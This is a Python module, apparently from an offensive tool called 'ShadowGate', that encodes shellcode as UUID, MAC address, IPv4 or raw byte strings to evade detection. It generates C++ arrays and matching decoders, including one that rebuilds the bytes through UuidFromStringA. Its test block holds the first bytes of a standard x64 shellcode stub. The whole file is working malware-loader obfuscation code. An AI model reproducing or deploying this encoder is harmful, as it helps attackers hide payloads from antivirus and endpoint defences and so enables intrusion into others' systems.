"""
ShadowGate - Shellcode Encoder Module
Encodes shellcode as UUID, MAC, IPv4, or raw bytes
"""

import uuid
import struct
from typing import List, Tuple


# ============================================================================
# Shellcode Encoder
# ============================================================================

class ShellcodeEncoder:
    """Encodes shellcode into various formats for evasion"""
    
    # ========================================================================
    # Utility Functions
    # ========================================================================
    
    @staticmethod
    def pad_shellcode(shellcode: bytes, block_size: int) -> bytes:
        """Pad shellcode to multiple of block_size with NOPs"""
        remainder = len(shellcode) % block_size
        if remainder != 0:
            padding_needed = block_size - remainder
            shellcode += b'\x90' * padding_needed
        return shellcode
    
    @staticmethod
    def calculate_padded_size(original_size: int, block_size: int) -> int:
        """Calculate size after padding"""
        remainder = original_size % block_size
        if remainder == 0:
            return original_size
        return original_size + (block_size - remainder)
    
    # ========================================================================
    # UUID Encoding (16 bytes per element)
    # ========================================================================
    
    @staticmethod
    def encode_uuid(shellcode: bytes) -> Tuple[List[str], str, int]:
        """
        Encode shellcode as UUID strings
        Each UUID represents 16 bytes
        
        Returns:
            - List of UUID strings
            - C++ code
            - Original shellcode length
        """
        original_len = len(shellcode)
        padded = ShellcodeEncoder.pad_shellcode(shellcode, 16)
        
        uuids = []
        for i in range(0, len(padded), 16):
            chunk = padded[i:i+16]
            # Convert bytes to UUID (little-endian)
            u = uuid.UUID(bytes_le=chunk)
            uuids.append(str(u))
        
        # Generate C++ code
        cpp_lines = []
        cpp_lines.append("// ============================================================================")
        cpp_lines.append("// Encoded Shellcode (UUID Format)")
        cpp_lines.append("// ============================================================================\n")
        cpp_lines.append("const char* g_EncodedShellcode[] = {")
        
        for i, u in enumerate(uuids):
            comma = "," if i < len(uuids) - 1 else ""
            cpp_lines.append(f'    "{u}"{comma}')
        
        cpp_lines.append("};")
        cpp_lines.append(f"SIZE_T g_EncodedCount = {len(uuids)};")
        cpp_lines.append(f"SIZE_T g_OriginalSize = {original_len};")
        cpp_lines.append(f"#define ENCODING_TYPE ENCODE_UUID")
        
        return uuids, '\n'.join(cpp_lines), original_len
    
    # ========================================================================
    # MAC Address Encoding (6 bytes per element)
    # ========================================================================
    
    @staticmethod
    def encode_mac(shellcode: bytes) -> Tuple[List[str], str, int]:
        """
        Encode shellcode as MAC addresses
        Each MAC represents 6 bytes
        Format: XX-XX-XX-XX-XX-XX
        
        Returns:
            - List of MAC strings
            - C++ code
            - Original shellcode length
        """
        original_len = len(shellcode)
        padded = ShellcodeEncoder.pad_shellcode(shellcode, 6)
        
        macs = []
        for i in range(0, len(padded), 6):
            chunk = padded[i:i+6]
            mac = '-'.join(f'{b:02X}' for b in chunk)
            macs.append(mac)
        
        # Generate C++ code
        cpp_lines = []
        cpp_lines.append("// ============================================================================")
        cpp_lines.append("// Encoded Shellcode (MAC Address Format)")
        cpp_lines.append("// ============================================================================\n")
        cpp_lines.append("const char* g_EncodedShellcode[] = {")
        
        for i, mac in enumerate(macs):
            comma = "," if i < len(macs) - 1 else ""
            cpp_lines.append(f'    "{mac}"{comma}')
        
        cpp_lines.append("};")
        cpp_lines.append(f"SIZE_T g_EncodedCount = {len(macs)};")
        cpp_lines.append(f"SIZE_T g_OriginalSize = {original_len};")
        cpp_lines.append(f"#define ENCODING_TYPE ENCODE_MAC")
        
        return macs, '\n'.join(cpp_lines), original_len
    
    # ========================================================================
    # IPv4 Encoding (4 bytes per element)
    # ========================================================================
    
    @staticmethod
    def encode_ipv4(shellcode: bytes) -> Tuple[List[str], str, int]:
        """
        Encode shellcode as IPv4 addresses
        Each IP represents 4 bytes
        Format: XXX.XXX.XXX.XXX
        
        Returns:
            - List of IPv4 strings
            - C++ code
            - Original shellcode length
        """
        original_len = len(shellcode)
        padded = ShellcodeEncoder.pad_shellcode(shellcode, 4)
        
        ips = []
        for i in range(0, len(padded), 4):
            chunk = padded[i:i+4]
            ip = '.'.join(str(b) for b in chunk)
            ips.append(ip)
        
        # Generate C++ code
        cpp_lines = []
        cpp_lines.append("// ============================================================================")
        cpp_lines.append("// Encoded Shellcode (IPv4 Address Format)")
        cpp_lines.append("// ============================================================================\n")
        cpp_lines.append("const char* g_EncodedShellcode[] = {")
        
        for i, ip in enumerate(ips):
            comma = "," if i < len(ips) - 1 else ""
            cpp_lines.append(f'    "{ip}"{comma}')
        
        cpp_lines.append("};")
        cpp_lines.append(f"SIZE_T g_EncodedCount = {len(ips)};")
        cpp_lines.append(f"SIZE_T g_OriginalSize = {original_len};")
        cpp_lines.append(f"#define ENCODING_TYPE ENCODE_IPV4")
        
        return ips, '\n'.join(cpp_lines), original_len
    
    # ========================================================================
    # Raw Encoding (byte array)
    # ========================================================================
    
    @staticmethod
    def encode_raw(shellcode: bytes) -> Tuple[bytes, str, int]:
        """
        No encoding - raw byte array
        
        Returns:
            - Original shellcode
            - C++ code
            - Original shellcode length
        """
        original_len = len(shellcode)
        
        # Generate C++ code
        cpp_lines = []
        cpp_lines.append("// ============================================================================")
        cpp_lines.append("// Encoded Shellcode (Raw Bytes)")
        cpp_lines.append("// ============================================================================\n")
        cpp_lines.append("unsigned char g_EncodedShellcode[] = {")
        
        # Format bytes in rows of 16
        for i in range(0, len(shellcode), 16):
            chunk = shellcode[i:i+16]
            hex_bytes = ', '.join(f'0x{b:02X}' for b in chunk)
            comma = "," if i + 16 < len(shellcode) else ""
            cpp_lines.append(f'    {hex_bytes}{comma}')
        
        cpp_lines.append("};")
        cpp_lines.append(f"SIZE_T g_EncodedCount = {len(shellcode)};")
        cpp_lines.append(f"SIZE_T g_OriginalSize = {original_len};")
        cpp_lines.append(f"#define ENCODING_TYPE ENCODE_RAW")
        
        return shellcode, '\n'.join(cpp_lines), original_len
    
    # ========================================================================
    # Encoder Dispatcher
    # ========================================================================
    
    def encode(self, shellcode: bytes, method: str = "uuid") -> Tuple[any, str, int]:
        """
        Encode shellcode using specified method
        
        Args:
            shellcode: Raw or encrypted shellcode bytes
            method: 'uuid', 'mac', 'ipv4', or 'raw'
        
        Returns:
            - Encoded data (list of strings or bytes)
            - C++ code
            - Original length
        """
        if method == "uuid":
            return self.encode_uuid(shellcode)
        elif method == "mac":
            return self.encode_mac(shellcode)
        elif method == "ipv4":
            return self.encode_ipv4(shellcode)
        elif method == "raw":
            return self.encode_raw(shellcode)
        else:
            raise ValueError(f"Unknown encoding method: {method}")
    
    # ========================================================================
    # C++ Decoder Generation
    # ========================================================================
    
    @staticmethod
    def generate_cpp_decoder(method: str = "uuid") -> str:
        """Generate C++ decoder function for the encoding method"""
        
        if method == "uuid":
            return '''
// ============================================================================
// UUID Decoder
// ============================================================================
#include <Rpc.h>
#pragma comment(lib, "Rpcrt4.lib")

BOOL DecodeShellcode(unsigned char* pOutput, SIZE_T* pOutputLen) {
    SIZE_T offset = 0;
    
    for (SIZE_T i = 0; i < g_EncodedCount; i++) {
        UUID uid;
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)g_EncodedShellcode[i], &uid);
        if (status != RPC_S_OK) {
            return FALSE;
        }
        
        // Copy UUID bytes (16 bytes) - little-endian
        memcpy(pOutput + offset, &uid, 16);
        offset += 16;
    }
    
    *pOutputLen = g_OriginalSize;
    return TRUE;
}
'''
        
        elif method == "mac":
            return '''
// ============================================================================
// MAC Address Decoder
// ============================================================================

BOOL ParseMacAddress(const char* macStr, unsigned char* out) {
    int values[6];
    if (sscanf_s(macStr, "%02X-%02X-%02X-%02X-%02X-%02X",
                 &values[0], &values[1], &values[2],
                 &values[3], &values[4], &values[5]) != 6) {
        return FALSE;
    }
    for (int i = 0; i < 6; i++) {
        out[i] = (unsigned char)values[i];
    }
    return TRUE;
}

BOOL DecodeShellcode(unsigned char* pOutput, SIZE_T* pOutputLen) {
    SIZE_T offset = 0;
    unsigned char mac[6];
    
    for (SIZE_T i = 0; i < g_EncodedCount; i++) {
        if (!ParseMacAddress(g_EncodedShellcode[i], mac)) {
            return FALSE;
        }
        memcpy(pOutput + offset, mac, 6);
        offset += 6;
    }
    
    *pOutputLen = g_OriginalSize;
    return TRUE;
}
'''
        
        elif method == "ipv4":
            return '''
// ============================================================================
// IPv4 Address Decoder
// ============================================================================

BOOL ParseIpv4Address(const char* ipStr, unsigned char* out) {
    int values[4];
    if (sscanf_s(ipStr, "%d.%d.%d.%d",
                 &values[0], &values[1], &values[2], &values[3]) != 4) {
        return FALSE;
    }
    for (int i = 0; i < 4; i++) {
        out[i] = (unsigned char)values[i];
    }
    return TRUE;
}

BOOL DecodeShellcode(unsigned char* pOutput, SIZE_T* pOutputLen) {
    SIZE_T offset = 0;
    unsigned char ip[4];
    
    for (SIZE_T i = 0; i < g_EncodedCount; i++) {
        if (!ParseIpv4Address(g_EncodedShellcode[i], ip)) {
            return FALSE;
        }
        memcpy(pOutput + offset, ip, 4);
        offset += 4;
    }
    
    *pOutputLen = g_OriginalSize;
    return TRUE;
}
'''
        
        else:  # raw
            return '''
// ============================================================================
// Raw Decoder (no decoding needed)
// ============================================================================

BOOL DecodeShellcode(unsigned char* pOutput, SIZE_T* pOutputLen) {
    memcpy(pOutput, g_EncodedShellcode, g_EncodedCount);
    *pOutputLen = g_OriginalSize;
    return TRUE;
}
'''
    
    # ========================================================================
    # Encoding Type Defines
    # ========================================================================
    
    @staticmethod
    def generate_cpp_encoding_defines() -> str:
        """Generate C++ encoding type definitions"""
        return '''
// ============================================================================
// Encoding Type Definitions
// ============================================================================

#define ENCODE_UUID     1
#define ENCODE_MAC      2
#define ENCODE_IPV4     3
#define ENCODE_RAW      4
'''


# ============================================================================
# Test
# ============================================================================

if __name__ == "__main__":
    encoder = ShellcodeEncoder()
    
    # Test shellcode (example: calc.exe shellcode stub)
    test_shellcode = bytes([
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00,
        0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
        0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
        0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
        0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7,
        0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    ])
    
    print(f"Original shellcode: {len(test_shellcode)} bytes")
    print(f"Hex: {test_shellcode.hex()[:64]}...\n")
    
    # Test UUID encoding
    print("=" * 60)
    print("UUID Encoding:")
    print("=" * 60)
    uuids, cpp_uuid, orig_len = encoder.encode(test_shellcode, "uuid")
    print(f"Number of UUIDs: {len(uuids)}")
    print(f"First UUID: {uuids[0]}")
    print(f"Last UUID: {uuids[-1]}")
    
    # Test MAC encoding
    print("\n" + "=" * 60)
    print("MAC Encoding:")
    print("=" * 60)
    macs, cpp_mac, orig_len = encoder.encode(test_shellcode, "mac")
    print(f"Number of MACs: {len(macs)}")
    print(f"First MAC: {macs[0]}")
    print(f"Last MAC: {macs[-1]}")
    
    # Test IPv4 encoding
    print("\n" + "=" * 60)
    print("IPv4 Encoding:")
    print("=" * 60)
    ips, cpp_ipv4, orig_len = encoder.encode(test_shellcode, "ipv4")
    print(f"Number of IPs: {len(ips)}")
    print(f"First IP: {ips[0]}")
    print(f"Last IP: {ips[-1]}")
    
    # Print generated C++ code
    print("\n" + "=" * 60)
    print("Generated C++ (UUID):")
    print("=" * 60)
    print(cpp_uuid)